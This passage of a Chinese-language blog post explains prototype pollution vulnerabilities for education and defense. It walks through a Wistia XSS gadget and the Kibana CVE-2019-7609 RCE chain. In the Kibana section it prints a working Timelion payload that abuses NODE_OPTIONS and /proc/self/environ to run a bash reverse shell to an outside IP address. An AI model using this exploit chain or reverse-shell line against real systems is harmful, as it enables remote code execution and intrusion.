    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">=</span> i<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>href<span class="token punctuation">)</span><span class="token punctuation">,</span>
    document<span class="token punctuation">.</span>referrer <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>u <span class="token operator">=</span> i<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>referrer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>它會去解析 <code>location.href</code> 跟 <code>document.referrer</code>，這兩者都是攻擊者可控的，然後 <code>i.url.parse</code> 這個 function 有著 prototype pollution 的漏洞，所以可以污染任意屬性。</p>
<p>污染之後，作者發現了另外一段程式碼，這一段程式碼跟我們前面寫過的 <code>createElement</code> 有異曲同工之妙，<code>fromObject</code> 會去遍歷屬性然後放到 DOM 上：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>chrome <span class="token operator">=</span> r<span class="token punctuation">.</span>elem<span class="token punctuation">.</span><span class="token function">fromObject</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">id</span><span class="token operator">:</span> r<span class="token punctuation">.</span><span class="token function">seqId</span><span class="token punctuation">(</span><span class="token string">'wistia_chrome_'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">class</span><span class="token operator">:</span> <span class="token string">'w-chrome'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">style</span><span class="token operator">:</span> r<span class="token punctuation">.</span>generate<span class="token punctuation">.</span><span class="token function">relativeBlockCss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token literal-property property">tabindex</span><span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以只要污染 <code>innerHTML</code>，就可以利用這個 script gadget 製造出一個 XSS 漏洞。實際的攻擊方式就是構造出一個能夠觸發 prototype pollution + XSS 的網址，只要把網址傳給別人，點開以後就會直接遭受到攻擊。</p>
<p>這攻擊後半段還有繞過 CSP 的段落，用的是之前我在 <a target="_blank" rel="noopener" href="https://tech-blog.cymetrics.io/posts/huli/front-end-supply-chain-attack-cdnjs/">從 cdnjs 的漏洞來看前端的供應鏈攻擊與防禦</a>中有提過的技巧。</p>
<p>另一個案例是 Kibana 的漏洞，原始文章在這裡：<a target="_blank" rel="noopener" href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609)</a>，官方對於這個漏洞的描述是這樣的：</p>
<blockquote>
<p>An attacker with access to the Timelion application could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.</p>
</blockquote>
<p>在 Kibana 裡面有一個 Timelion 的功能，可以自己輸入語法並且畫成圖表，而下面這一段語法可以污染 prototype：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">.</span>es<span class="token punctuation">.</span><span class="token function">props</span><span class="token punctuation">(</span>label<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>x<span class="token operator">=</span><span class="token string">'ABC'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>污染 prototype 只是第一步，下一步是要找出 script gadget，kibana 中的其中一段程式碼長這樣子：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> env <span class="token operator">=</span> options<span class="token punctuation">.</span>env <span class="token operator">||</span> process<span class="token punctuation">.</span>env<span class="token punctuation">;</span>
<span class="token keyword">var</span> envPairs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> key <span class="token keyword">in</span> env<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> value <span class="token operator">=</span> env<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    envPairs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>value<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>這一段會來拿構造環境變數，而這個環境變數會用來跑新的 node process，例如說 envPairs 如果是 <code>a=1</code> 的話，應該就會跑 <code>a=1 node xxx.js</code> 這個指令。</p>
<p>既然是跑 node.js，我們可以利用 <code>NODE_OPTIONS</code> 這個環境變數來偷偷引入檔案：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// a.js</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'a.js'</span><span class="token punctuation">)</span>

<span class="token comment">// b.js</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'b.js'</span><span class="token punctuation">)</span>

<span class="token comment">// 跑這個指令，用環境變數引入 a.js</span>
<span class="token constant">NODE_OPTIONS</span><span class="token operator">=</span><span class="token string">"--require ./a.js"</span> node b<span class="token punctuation">.</span>js

<span class="token comment">// 輸出</span>
a<span class="token punctuation">.</span>js
b<span class="token punctuation">.</span>js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以，如果我們可以上傳一個 js 檔案，就可以搭配 prototype pollution 去執行這個檔案了。聽起來有點麻煩，有其他方法嗎？</p>
<p>有！有一個滿常用的技巧是有些檔案的內容其實是可控的，例如說 PHP 中的 session 內容就有機會控制，可參考這一篇：<a target="_blank" rel="noopener" href="https://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce">透過 LFI 引入 PHP session 檔案觸發 RCE</a>，而另一個 Linux 系統中的檔案 <code>/proc/self/environ</code> 則是會有現在的 process 的所有環境變數。</p>
<p>如果我們建立一個環境變數叫做 <code>A=console.log(123)//</code>，<code>/proc/self/environ</code> 的內容就會變為：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">A</span><span class="token operator">=</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token comment">//YARN_VERSION=1.1PWD=/userLANG=en_US.UTF-8....</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>就變成了合法的 JS 程式碼！</p>
<p>於是就可以利用這樣的方式去執行它：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">NODE_OPTIONS</span><span class="token operator">=</span><span class="token string">"--require /proc/self/environ"</span> <span class="token constant">A</span><span class="token operator">=</span><span class="token string">'console.log(1)//'</span> node b<span class="token punctuation">.</span>js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>作者最後給出的 code 長這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">.</span><span class="token function">es</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">props</span><span class="token punctuation">(</span>label<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">AAAA</span><span class="token operator">=</span><span class="token string">'require("child_process").exec("bash -i >&amp; /dev/tcp/192.168.0.136/12345 0>&amp;1");process.exit()//'</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">props</span><span class="token punctuation">(</span>label<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">NODE_OPTIONS</span><span class="token operator">=</span><span class="token string">'--require /proc/self/environ'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>污染了兩個不同的屬性，創造了兩個環境變數，一個用來把 <code>/proc/self/environ</code> 變成合法的 JS 並且包含了要執行的程式碼，另一個 <code>NODE_OPTIONS</code> 則透過 <code>--require</code> 去引入 <code>/proc/self/environ</code>，最後就串成了可以執行任意程式碼的 RCE 漏洞！</p>
<h2><span id="結語">結語</span></h2><p>我自己在接觸資安以前，是沒有聽過 prototype pollution 的。</p>
<p>因此當我第一次接觸到 prototype pollution 這個漏洞的時候，我覺得有些驚訝。我驚訝的點在於，為什麼我從來沒聽過這個？比起前端常見的漏洞像是 XSS 或是 CSRF 等等，prototype pollution 的知名度似乎低了許多。</p>
<p>有些人第一次看到這名詞可能是因為某個 NPM 的 package 有這個漏洞，升級版本以後就修掉了，但可能沒有去理解這個漏洞的成因以及可能的影響。</p>
<p>我自己其實滿愛這個漏洞的，第一是我覺得成因很有趣，第二是我覺得尋找 script gadget 也很有趣。總之呢，希望能藉由這篇文章，讓更多前端工程師認識到這個漏洞，並且知道它的原理以及防禦方式。</p>
<p>最後推薦大家一篇超讚的文章，透過自動化的方式去檢測 prototype pollution 漏洞，並且找出發生問題的地方，我覺得把 prototype pollution 又提升到了另一個境界：<a target="_blank" rel="noopener" href="https://blog.s1r1us.ninja/research/PP">A tale of making internet pollution free - Exploiting Client-Side Prototype Pollution in the wild</a></p>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Front-end/">#Front-end</a></span>
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Security/">#Security</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2021/10/11/xss-history/">XSS 從頭談起：歷史與由來</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2021/09/26/what-is-open-redirect/">在做跳轉功能時應該注意的問題：Open Redirect</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">評論</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2024 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>繁體中文</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2021/09/29/en/prototype-pollution/" class="dropdown-item">
                    English
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>